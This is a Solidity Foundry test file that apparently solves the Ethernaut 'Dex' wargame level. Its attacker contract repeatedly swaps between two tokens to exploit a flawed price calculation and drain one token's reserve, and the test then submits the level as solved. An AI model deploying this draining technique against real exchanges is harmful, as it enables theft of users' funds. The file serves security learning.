// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IDex {
  function token1() external returns(address);
  function token2() external returns(address);
  function approve(address spender, uint amount) external;
  function swap(address from, address to, uint amount) external;
  function balanceOf(address token, address account) external returns (uint);
}

contract DexAttacker {
 function attack(IDex dex) public {
    address from = dex.token1();
    address to = dex.token2();
    address tmp; // textbook flipping of two variables
    uint256 desiredSwapAmount;
    uint256 balanceDexFrom;

    while (true) {
      desiredSwapAmount = dex.balanceOf(from, address(this));
      balanceDexFrom = dex.balanceOf(from, address(dex));

      // keep your ask within the amounts in the dex
      // we arrive here by solving x * (to/from) = to, for x
      if (desiredSwapAmount > balanceDexFrom) {
        desiredSwapAmount = balanceDexFrom;
      }

      dex.swap(from, to, desiredSwapAmount);

      if (dex.balanceOf(to, address(dex)) == 0) {
        break;
      } else {
        tmp = from;
        from = to;
        to = tmp;
      }
    }
  }
}

contract DexTest is Test {
  address internal challengeAddress;
  IDex internal dex;
  DexAttacker internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xC084FC117324D7C628dBC41F17CAcAaF4765f49e);
    dex = IDex(challengeAddress);
    dex.approve(challengeAddress, 100);
    attackContract = new DexAttacker();
  }

  function testExploit() public {
    (bool success,) = address(attackContract).delegatecall(abi.encodeWithSignature("attack(address)", address(dex)));
    require(success);

    utils.submitLevelInstance(challengeAddress);
  }
}
